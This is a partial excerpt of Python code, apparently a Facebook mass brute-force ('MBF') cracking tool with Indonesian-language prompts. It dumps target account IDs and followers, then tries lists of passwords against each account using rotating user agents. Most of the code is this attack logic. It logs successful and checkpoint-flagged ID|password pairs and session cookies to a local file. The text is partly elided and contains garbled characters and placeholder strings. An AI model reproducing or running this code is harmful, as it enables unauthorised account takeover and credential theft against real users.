...
def menu(my_name,my_id):
	...
	if _____YADA__YADA_____ in ['1']:
		dump_massal()
	elif _____YADA__YADA_____ in ['2']:
		dump_follower()
	elif _____YADA__YADA_____ in ['3']:
		error()
	elif _____YADA__YADA_____ in ['4']:
		crack_file()
	elif _____YADA__YADA_____ in ['5']:
		result()
	elif _____YADA__YADA_____ in ['0']:
...
def lah():
	print("\r"+balmond+m+" \x1b[1;90m :\x1b[1;90m "+str(len(id))+"                     ")
	input(balmond+m +"\x1b[1;94m Klik [\x1b[1;96m Enter ]\x1b[1;94m Jika Ingin Langsung Crack !!")
	pass
	setting()
def grup():
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r ∯ ∆ →↓SADAM↓← ∆ ∯     →→→{P}  {b}{loop} ∫✓{P}{u}{len(id)}{P} {P}{H} ∫√ {ok}{P}  {P}{k}  {cp}  ∫√→→ {x}{bo}{'{:.0%}'.format(loop/float(len(id)))}{P})"),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r  {K} GUBXO CPYA MAZA HHH   {idf}|{pw}{N}')     
				os.popen('YADA CP')
				...
				print(f'\r  {H}                ______________________________________________________   ◢◣◥◤◢◣◥◤◢◣◥◤◢◣    [◢◣◥◤◢◣_____[SADAM-√) (email→✓)[◢◣◥◤[      {idf}     ] ◥◤◢◣◢](pass→✓)◥◤◣◢[     {pw}      ]◢◣◥◤◢◣◥◤◢◣◥◤◢◣◢◣◥◤◥◤         ______________________________________________________ ◢◣◥◤◢◣     ◢◣◥◤◢◣ {kuki}\n{ua}{N}')
				os.popen('YADA OK')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\rYADA {P}[{asu}ML{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rYADA¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[YAA] ID       : {idf} [YADA] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[bold green][yada ok] ID       : {idf}\n[yada ok] PASSWORD : {pw}\n[yada ok] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s YADA¬ %s/%s â˜¬ OK:%s â˜¬ CP:%s â˜¬ %s%s%s â˜¬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[cp] ID       : {idf} [cp] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
